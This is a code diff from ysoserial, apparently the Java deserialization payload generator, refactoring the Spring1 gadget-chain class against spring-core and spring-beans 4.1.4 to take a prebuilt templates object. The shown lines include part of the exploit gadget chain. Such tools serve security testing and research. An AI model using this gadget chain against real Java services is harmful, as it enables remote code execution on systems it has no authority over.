@@ -51,11 +51,10 @@ import ysoserial.payloads.util.Reflections;
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 @Authors({ Authors.FROHOFF })
-public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
+public class Spring1 extends ParameterizedTransletObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
-
+	@Override
+	protected Object getObject(Object templates) throws Exception {
 		final ObjectFactory objectFactoryProxy =
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
 
@@ -78,7 +77,7 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 		PayloadRunner.run(Spring1.class, args);
 	}
 
-	public static boolean isApplicableJavaVersion() {
-	    return JavaVersion.isAnnInvHUniversalMethodImpl();
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
